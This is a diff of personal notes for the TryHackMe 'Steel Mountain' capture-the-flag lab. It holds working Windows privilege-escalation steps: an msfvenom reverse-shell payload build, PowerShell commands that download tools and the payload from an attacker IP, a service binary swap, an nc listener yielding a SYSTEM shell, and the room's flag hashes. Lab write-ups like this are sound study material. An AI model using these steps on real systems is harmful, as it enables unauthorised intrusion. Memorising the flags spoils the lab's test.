@@ -129,6 +129,7 @@ except:
 	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
 	Don't forgot to change the Local IP address and Port number on the script"""
 ####
+view code .... see nc.exe
 
 wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
 unzip netcat-win32-1.11.zip
@@ -151,13 +152,21 @@ b04763b6fcf51fcd7c13abc7db4fd365
 On my machine wget https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx86.exe
 msfvenom -p windows/shell_reverse_tcp LHOST=myip LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
 
+- What powershell -c command could we run to manually find out the service name? 
+hint: google "What powershell -c command could we run to manually find out the service name?" not quotes
 on target machine
 powershell -c wget "http://10.6.88.227/winPEASx86.exe" -outfile "winPEASx86.exe"
 powershell -c wget "http://10.6.88.227/ASCService.exe" -outfile "ASCService.exe"
+powershell -c "Get-Service"
+
+- Once this command runs, you will see you gain a shell as Administrator on our listener!
+on target machine
+winPEASx86.exe
 sc stop AdvancedSystemCareService9
 copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
 sc start AdvancedSystemCareService9
-on other terminal
+
+on other terminal my machine
 nc -lnvp 4443
 c:\windows\system32
 whoami
@@ -165,8 +174,12 @@ nt authority\system
 more c:\Users\Administrator\Desktop>root.txt
 9af5f314f57607c00fd09803a587db80
 
+no answer
+
 https://tryhackme.com/room/steelmountain
 https://blog.razrsec.uk/steel-mountain-walkthrough/
 https://www.aldeid.com/wiki/TryHackMe-Steel-Mountain
 https://www.thedutchhacker.com/steel-mountain-on-tryhackme/
 https://0n3z3r0n3.medium.com/tryhackme-steel-mountain-617bc052cabd
+https://jinshiranai.hashnode.dev/tryhackme-steel-mountain
+https://itsecuritydz.wordpress.com/2021/03/28/tryhackme-steel-mountain/
